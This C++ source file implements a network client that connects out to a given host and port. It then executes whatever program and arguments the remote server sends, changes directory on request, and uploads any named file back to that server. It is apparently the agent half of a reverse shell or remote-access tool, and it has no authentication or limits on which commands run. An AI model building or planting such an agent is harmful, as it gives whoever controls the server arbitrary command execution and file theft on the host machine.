#include "client.hpp"

#include <sstream>
#include <iterator>
#include <chrono>

Client::Client(boost::asio::io_context &context_)
: context(context_), socket(context_)
{
    
}

void Client::startConnection(std::string_view hostIp, unsigned short port)
{
    endpoint.address(boost::asio::ip::make_address_v4(hostIp));
    endpoint.port(port);
    boost::system::error_code error;
    socket.connect(endpoint, error);
    if (error)
    {
        std::cout << "ERROR: " << error.message() << std::endl;
        return;
    }
    std::cout << "Connected..." << std::endl;
    receiveData();
}

void Client::receiveData()
{
    socket.async_read_some(
        boost::asio::buffer(buffer),
        boost::bind(&Client::handleReading,
            this,
            boost::asio::placeholders::error,
            boost::asio::placeholders::bytes_transferred)
    );
}

void Client::handleReading(const boost::system::error_code &er, std::size_t data_)
{
    if (!er)
    {
        std::cout << "Byte: " << data_ << std::endl;
        std::vector<uint8_t> binaryData;
        binaryData.insert(std::begin(binaryData), std::begin(buffer), (std::begin(buffer)+data_));
        this->handleBinData(binaryData);
    }

    else if(er == boost::asio::error::eof)
    {
        std::cerr << "ERROR: " << er.message() << std::endl;
        exit(1);
    }

    else
    {
        std::cout << "Some other error...\n";
        exit(1);
    }
    receiveData();
}

void Client::handleBinData(const std::vector<uint8_t> &binaryData_)
{
    try
    {
        json jsonData = json::from_bson(binaryData_);
        std::cout << jsonData << std::endl;
        //std::cout << "Name: " << jsonData.at("Name").get<std::string>() << std::endl;
        std::string program = jsonData.at("program");
        if (program == "cd")
        {
            try
            {
                util::Utility::setCurrendDir(std::string(jsonData.at("args")));
                sendResponse("Directory changed");
            }
            catch(util::DirNotFound& e)
            {
                std::cerr << e.what() << '\n';
            }
        }

        else if (program == "servcp")
        {
            prepareFile(std::string(jsonData.at("args")));
        }

        else
        {
            auto commandResult = runCommand(program, std::string(jsonData.at("args")));
            sendResponse(commandResult);
        }
        
    }
    catch(nlohmann::detail::parse_error &e)
    {
        std::cerr << "Parsing error..." << e.what() << std::endl;
    }
    catch(const std::exception& e)
    {
        std::cerr << e.what() << '\n';
    }
}

void Client::sendResponse(std::string_view response)
{
    json jResponse;
    jResponse["res"] = response.data();
    jResponse["cwd"] = util::Utility::currentDir();

    std::vector<uint8_t> toSend = json::to_bson(jResponse);
    std::cout << "Sending: " << toSend.size() <<" Bytes"<< std::endl;
    send(toSend);
}

void Client::sendResponse(std::string_view response, const std::vector<uint8_t> &data)
{
    json response_;
    response_["res"] = response.data();
    response_["cwd"] = util::Utility::currentDir();
    response_["data"] = json::binary(data);

    data_ = json::to_bson(response_);
    std::cout << "Sending: " << data_.size() << std::endl;
    boost::system::error_code error;

    send(data_);
}

void Client::send(const std::vector<uint8_t> &dataToSend)
{
    boost::asio::async_write(
        socket,
        boost::asio::buffer(dataToSend, dataToSend.size()),
        boost::asio::transfer_all(),
        [this](const boost::system::error_code &error, std::size_t byteSent){
            if (!error)
                std::cout << "Sent " << byteSent << " bytes" << '\n';
            
            else
                std::cout << "ERROR while sending: " << error.message() << '\n';            
        }
    );
}

void Client::prepareFile(std::string_view filename)
{
    std::cout << "Preparing send file: " << filename.data() << std::endl;
    util::File file(filename.data());
    auto data = file.readBinary();
    sendResponse(filename, data);
}

std::string Client::runCommand(std::string_view program, std::string_view args)
{
    auto cmd = program.data() + std::string(" ") + args.data();
    auto result = util::Utility::excuteCommand(cmd);
    return result;
}

Client::~Client()
{}